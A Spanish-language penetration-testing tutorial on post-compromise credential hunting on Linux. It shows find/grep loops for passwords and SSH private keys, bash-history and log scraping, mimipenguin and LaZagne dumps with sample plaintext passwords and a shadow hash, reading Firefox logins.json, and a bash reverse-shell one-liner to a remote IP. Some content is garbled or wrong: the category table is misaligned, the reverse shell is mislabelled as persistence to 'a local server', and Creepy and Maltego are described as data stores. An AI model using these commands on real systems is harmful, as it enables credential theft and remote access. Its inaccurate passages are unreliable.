# Credential Hunting in Linux

Buscar credenciales es uno de los primeros pasos una vez que hemos accedido al sistema. Estos "frutos bajos" pueden proporcionarnos privilegios elevados en cuestión de segundos o minutos. Entre otras cosas, esto forma parte del proceso de escalada de privilegios locales que cubriremos aquí. Sin embargo, es importante tener en cuenta que estamos lejos de cubrir todas las situaciones posibles, por lo que nos centraremos en los diferentes enfoques.

Podemos imaginar que hemos conseguido acceder a un sistema a través de una aplicación web vulnerable y, por lo tanto, hemos obtenido una reverse shell, por ejemplo. Por lo tanto, para escalar nuestros privilegios de la manera más eficiente, podemos buscar contraseñas o incluso credenciales completas que podamos usar para iniciar sesión en nuestro objetivo. Hay varias fuentes que pueden proporcionarnos credenciales que se agrupan en cuatro categorías:

* **Archivos**
* **Historial**
* **Memoria**
* **Key-Rings**

| Categoría      | Detalles                                                       |
| -------------- | -------------------------------------------------------------- |
| Archivos       | Configs, Logs, Cache, Credenciales almacenadas en el navegador |
| Bases de datos | Historial de la línea de comandos, Procesamiento en memoria    |
| Notas          |                                                                |
| Scripts        |                                                                |
| Códigos fuente |                                                                |
| Cronjobs       |                                                                |
| Claves SSH     |                                                                |

Enumerar todas estas categorías nos permitirá aumentar la probabilidad de encontrar con facilidad las credenciales de los usuarios existentes en el sistema. Hay innumerables situaciones diferentes en las que siempre veremos diferentes resultados. Por lo tanto, debemos adaptar nuestro enfoque a las circunstancias del entorno y mantener la perspectiva general en mente. Sobre todo, es crucial tener en cuenta cómo funciona el sistema, su enfoque, qué propósito tiene y qué papel desempeña en la lógica empresarial y la red en general. Por ejemplo, si se trata de un servidor de base de datos aislado, no necesariamente encontraremos usuarios normales allí, ya que es una interfaz sensible en la gestión de datos a la que solo se concede acceso a unas pocas personas.

## Archivos

Un principio fundamental de Linux es que todo es un archivo. Por lo tanto, es crucial tener en cuenta este concepto y buscar, encontrar y filtrar los archivos apropiados según nuestros requisitos. Debemos buscar, encontrar e inspeccionar varias categorías de archivos uno por uno. Estas categorías son las siguientes:

* **Archivos de configuración**
* **Bases de datos**
* **Notas**
* **Scripts**
* **Cronjobs**
* **Claves SSH**

Los archivos de configuración son el núcleo de la funcionalidad de los servicios en las distribuciones de Linux. A menudo, incluso contienen credenciales que podremos leer. Su revisión también nos permite entender cómo funciona el servicio y cuáles son sus requisitos. Normalmente, los archivos de configuración están marcados con las siguientes tres extensiones de archivo: `.config`, `.conf`, `.cnf`. Sin embargo, estos archivos de configuración o los archivos de extensión asociados pueden ser renombrados, lo que significa que estas extensiones de archivo no son necesariamente requeridas. Además, incluso al recompilar un servicio, el nombre de archivo requerido para la configuración básica puede cambiar, lo que resultaría en el mismo efecto. Sin embargo, este es un caso raro que no encontraremos a menudo, pero esta posibilidad no debe ser excluida de nuestra búsqueda.

La parte más crucial de cualquier enumeración del sistema es obtener una visión general de él. Por lo tanto, el primer paso debería ser encontrar todos los archivos de configuración posibles en el sistema, que luego podemos examinar y analizar individualmente con más detalle. Hay muchos métodos para encontrar estos archivos de configuración, y con el siguiente método, veremos que hemos reducido nuestra búsqueda a estas tres extensiones de archivo.

### Archivos de Configuración

```bash
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
```

**Salida:**

```bash
File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Opcionalmente, podemos guardar el resultado en un archivo de texto y usarlo para examinar los archivos individuales uno tras otro. Otra opción es ejecutar el escaneo directamente para cada archivo encontrado con la extensión de archivo especificada y mostrar su contenido. En este ejemplo, buscamos tres palabras (user, password, pass) en cada archivo con la extensión `.cnf`.

### Credenciales en Archivos de Configuración

```bash
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"; done
```

**Salida:**

```javascript
File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

Podemos aplicar esta búsqueda simple a las otras extensiones de archivo también. Además, podemos aplicar este tipo de búsqueda a las bases de datos almacenadas en archivos con diferentes extensiones de archivo, y luego podemos leer esas.

### Bases de Datos

```bash
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*"); do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done
```

**Salida:**

```bash
DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
```

### Notes

```bash
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Los scripts son archivos que a menudo contienen información y procesos altamente sensibles. Entre otras cosas, estos también contienen credenciales que son necesarias para poder invocar y ejecutar los procesos automáticamente. De lo contrario, el administrador o desarrollador tendría que ingresar la contraseña correspondiente cada vez que se llama al script o al programa compilado.

### Scripts

```bash
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Extensión de archivo: .py**

**Extensión de archivo: .pyc**

**Extensión de archivo: .pl**

**Extensión de archivo: .go**

**Extensión de archivo: .jar**

**Extensión de archivo: .c**

**Extensión de archivo: .sh**

```bash
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

### Cronjobs

Los cronjobs son la ejecución independiente de comandos, programas y scripts. Estos se dividen en el área de sistema (/etc/crontab) y en las ejecuciones dependientes del usuario. Algunas aplicaciones y scripts requieren credenciales para ejecutarse y, por lo tanto, se ingresan incorrectamente en los cronjobs. Además, existen áreas que se dividen en diferentes rangos de tiempo (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). Los scripts y archivos utilizados por cron también se pueden encontrar en /etc/cron.d/ para distribuciones basadas en Debian.

```bash
cry0l1t3@unixclient:~$ cat /etc/crontab
```

```plaintext
# /etc/crontab: crontab a nivel de sistema
# A diferencia de cualquier otro crontab, no tienes que ejecutar el comando `crontab`
# para instalar la nueva versión cuando editas este archivo
# y los archivos en /etc/cron.d. Estos archivos también tienen campos de nombre de usuario,
# que ninguno de los otros crontabs tiene.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Ejemplo de definición de trabajo:
# .---------------- minuto (0 - 59)
# |  .------------- hora (0 - 23)
# |  |  .---------- día del mes (1 - 31)
# |  |  |  .------- mes (1 - 12) O jan,feb,mar,apr ...
# |  |  |  |  .---- día de la semana (0 - 6) (domingo=0 o 7) O sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * nombre-de-usuario comando a ser ejecutado
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```bash
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/
```

```plaintext
/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

### Claves SSH

Las claves SSH pueden considerarse "tarjetas de acceso" para el protocolo SSH utilizado para el mecanismo de autenticación de clave pública. Se genera un archivo para el cliente (clave privada) y uno correspondiente para el servidor (clave pública). Sin embargo, estas no son las mismas, por lo que conocer la clave pública no es suficiente para encontrar la clave privada. La clave pública puede verificar las firmas generadas por la clave privada SSH y, por lo tanto, permite el inicio de sesión automático en el servidor. Incluso si personas no autorizadas obtienen la clave pública, es casi imposible calcular la clave privada correspondiente a partir de ella. Al conectarse al servidor utilizando la clave privada SSH, el servidor verifica si la clave privada es válida y permite que el cliente inicie sesión en consecuencia. Así, ya no se necesitan contraseñas para conectarse a través de SSH.

Dado que las claves SSH pueden nombrarse arbitrariamente, no podemos buscarlas por nombres específicos. Sin embargo, su formato nos permite identificarlas de manera única porque, tanto la clave pública como la clave privada, ambas tienen líneas iniciales únicas que las distinguen.

### Claves Privadas SSH

```bash
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

### Claves Públicas SSH

```bash
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

### Historial

Todos los archivos de historial proporcionan información crucial sobre el curso actual y pasado de los procesos. Nos interesan los archivos que almacenan el historial de comandos de los usuarios y los registros que almacenan información sobre los procesos del sistema.

En el historial de los comandos ingresados en distribuciones de Linux que utilizan Bash como shell estándar, encontramos los archivos asociados en `.bash_history`. Sin embargo, otros archivos como `.bashrc` o `.bash_profile` pueden contener información importante.

### Historial de Bash

```bash
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
```

```plaintext
==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

## Logs

Un concepto esencial de los sistemas Linux son los archivos de registro que se almacenan en archivos de texto. Muchos programas, especialmente todos los servicios y el sistema mismo, escriben en estos archivos. En ellos, encontramos errores del sistema, detectamos problemas relacionados con los servicios o seguimos lo que el sistema está haciendo en segundo plano. La totalidad de los archivos de registro se puede dividir en cuatro categorías:

* **Registros de Aplicaciones**
* **Registros de Eventos**
* **Registros de Servicios**
* **Registros del Sistema**

Existen muchos registros diferentes en el sistema. Estos pueden variar según las aplicaciones instaladas, pero aquí hay algunos de los más importantes:

| Archivo de Registro   | Descripción                                                            |
| --------------------- | ---------------------------------------------------------------------- |
| `/var/log/messages`   | Registros de actividad del sistema genéricos.                          |
| `/var/log/syslog`     | Registros de actividad del sistema genéricos.                          |
| `/var/log/auth.log`   | (Debian) Todos los registros relacionados con la autenticación.        |
| `/var/log/secure`     | (RedHat/CentOS) Todos los registros relacionados con la autenticación. |
| `/var/log/boot.log`   | Información de arranque.                                               |
| `/var/log/dmesg`      | Información y registros relacionados con hardware y controladores.     |
| `/var/log/kern.log`   | Advertencias, errores y registros relacionados con el núcleo.          |
| `/var/log/faillog`    | Intentos de inicio de sesión fallidos.                                 |
| `/var/log/cron`       | Información relacionada con trabajos cron.                             |
| `/var/log/mail.log`   | Todos los registros relacionados con el servidor de correo.            |
| `/var/log/httpd`      | Todos los registros relacionados con Apache.                           |
| `/var/log/mysqld.log` | Todos los registros relacionados con el servidor MySQL.                |

Cubrir el análisis de estos archivos de registro en detalle sería ineficiente en este caso. Así que, en este punto, debemos familiarizarnos con los registros individuales, examinándolos manualmente y entendiendo sus formatos. Sin embargo, aquí hay algunas cadenas que podemos usar para encontrar contenido interesante en los registros:

```bash
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Archivo de registro: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

**Archivo de registro: `/var/log/dpkg.log.1`**

```yaml
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
```

## Memoria y Caché

Muchas aplicaciones y procesos trabajan con credenciales necesarias para la autenticación y las almacenan ya sea en la memoria o en archivos para que puedan ser reutilizadas. Por ejemplo, pueden ser las credenciales requeridas por el sistema para los usuarios que han iniciado sesión. Otro ejemplo son las credenciales almacenadas en los navegadores, que también pueden ser leídas. Para recuperar este tipo de información de distribuciones de Linux, hay una herramienta llamada **mimipenguin** que facilita todo el proceso. Sin embargo, esta herramienta requiere permisos de administrador/root.

### Memoria - Mimipenguin

```bash
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

```bash
cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Otra herramienta aún más poderosa que podemos usar, que se mencionó anteriormente en la sección de Búsqueda de Credenciales en Windows, es **LaZagne**. Esta herramienta nos permite acceder a muchos más recursos y extraer las credenciales. Las contraseñas y hashes que podemos obtener provienen de las siguientes fuentes, pero no se limitan a:

* Wifi
* Wpa\_supplicant
* Libsecret
* Kwallet
* Basado en Chromium
* CLI
* Mozilla
* Thunderbird
* Git
* Env\_variable
* Grub
* Fstab
* AWS
* Filezilla
* Gftp
* SSH
* Apache
* Shadow
* Docker
* KeePass
* Mimipy
* Sesiones
* Keyrings

Por ejemplo, los **Keyrings** se utilizan para el almacenamiento seguro y la gestión de contraseñas en distribuciones de Linux. Las contraseñas se almacenan encriptadas y protegidas con una contraseña maestra. Es un administrador de contraseñas basado en el sistema operativo, que discutiremos más adelante en otra sección. De esta manera, no necesitamos recordar cada contraseña y podemos guardar las entradas de contraseñas repetidas.

### Memoria - LaZagne

```bash
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```

#### Salida de ejemplo:

```vbnet
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Contraseñas de Shadow -----------------

[+] ¡Hash encontrado!
Login: systemd-coredump
Hash: !!:18858::::::

[+] ¡Hash encontrado!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7::: 

[+] ¡Contraseña encontrada!
Login: cry0l1t3
Contraseña: WLpAEXFa0SbqOHY

[+] Se han encontrado 3 contraseñas.
Para más información, ejecútalo nuevamente con la opción -v

tiempo transcurrido = 3.50091600418
```

### Navegadores

Los navegadores almacenan las contraseñas guardadas por el usuario en una forma encriptada localmente en el sistema para ser reutilizadas. Por ejemplo, el navegador Mozilla Firefox almacena las credenciales encriptadas en una carpeta oculta para el respectivo usuario. Esto a menudo incluye los nombres de los campos asociados, URLs y otra información valiosa.

Por ejemplo, cuando almacenamos credenciales para una página web en el navegador Firefox, están encriptadas y se almacenan en `logins.json` en el sistema. Sin embargo, esto no significa que estén a salvo allí. Muchos empleados almacenan dichos datos de inicio de sesión en su navegador sin sospechar que pueden ser fácilmente desencriptados y utilizados en contra de la empresa.

### Credenciales Almacenadas en Firefox

```bash
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
```

#### Salida de ejemplo:

```arduino
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

### Búsqueda de Credenciales en Linux

```bash
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json
```

#### Salida de ejemplo:

```json
{
    "logins": [
        {
            "hostname": "https://example.com",
            "httpRealm": null,
            "formSubmitURL": "https://example.com/login",
            "usernameField": "username",
            "passwordField": "password",
            "encryptedUsername": "MWJhYjI5MzRlMTJiMWU3MDJjNDc0NDIyYjgwZDQ3MmU",
            "encryptedPassword": "MWJhYjI5MzRlMTJiMWU3MDJjNDc0NDIyYjgwZDQ3MmU"
        }
    ],
    "nextId": 3
}
```

A pesar de que el usuario puede almacenar sus contraseñas en su navegador, esto no significa que las contraseñas estén a salvo. En este punto, la mejor opción es tomar estas credenciales y almacenarlas en un entorno seguro, como un gestor de contraseñas. Sin embargo, la mayoría de las personas ignoran este consejo y continúan almacenando sus contraseñas en el navegador.

### Metadatos

Una vez que las credenciales son extraídas de sus respectivos recursos, el siguiente paso es recopilar información del sistema. Este paso nos permite reunir información sobre lo que tenemos y tener la oportunidad de obtener credenciales desde ahí. Aquí, podemos recopilar información sobre la arquitectura, puertos abiertos, información de la interfaz de red y otra información útil.

### Recopilación de Información - Metadatos

```bash
cry0l1t3@unixclient:~$ uname -a
```

#### Salida de ejemplo:

```graphql
Linux cry0l1t3 5.4.0-90-generic #101-Ubuntu SMP Mon Jun 21 12:21:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
cry0l1t3@unixclient:~$ lsb_release -a
```

#### Salida de ejemplo:

```yaml
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal
```

```bash
cry0l1t3@unixclient:~$ cat /etc/hostname
```

#### Salida de ejemplo:

```
cry0l1t3
```

```bash
cry0l1t3@unixclient:~$ ip a
```

#### Salida de ejemplo:

```sql
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:a4:8f:0a brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.101/24 brd 192.168.56.255 scope global dynamic ens33
       valid_lft 1800sec preferred_lft 1800sec
    inet6 fe80::250:56ff:fea4:8f0a/64 scope link
       valid_lft forever preferred_lft forever
```

### Persistencia

Este último paso es el más importante porque aquí es donde podemos acceder al sistema y quedarnos en él. Para ello, podemos establecer una conexión de reversa que nos dé acceso remoto al sistema. Las siguientes son algunas de las herramientas que podemos usar:

* **Reverse Shell**: esta técnica se utiliza para establecer una conexión de reversa con una máquina atacada para permitir la gestión remota.
* **SSH**: si podemos obtener las credenciales de SSH, podemos establecer una conexión y quedarnos allí. Por ejemplo, podríamos establecer una conexión desde una máquina local a una máquina de destino.
* **Backdoor**: si el atacante tiene acceso a la máquina de destino, puede instalar un backdoor en la máquina, que se puede utilizar para acceder al sistema más tarde.

### Código de Conexión de Reversa (Ejemplo)

```bash
bash -i >& /dev/tcp/192.168.1.5/1234 0>&1
```

El código anterior conecta a un servidor local en el puerto 1234. Esta es una manera básica de mantener la persistencia en el sistema.

### Guardar Información de forma Eficiente

Una vez que hemos recogido toda la información, es esencial almacenarla de forma eficiente. Esto significa utilizar herramientas adecuadas para que toda la información recopilada sea accesible más adelante. Herramientas como **Creepy** y **Maltego** pueden ayudarnos a almacenar toda la información. En este punto, podemos generar un informe que documente todas las credenciales, registros y cualquier otra información que hayamos recopilado. Esto facilitará futuras actividades en la red objetivo.
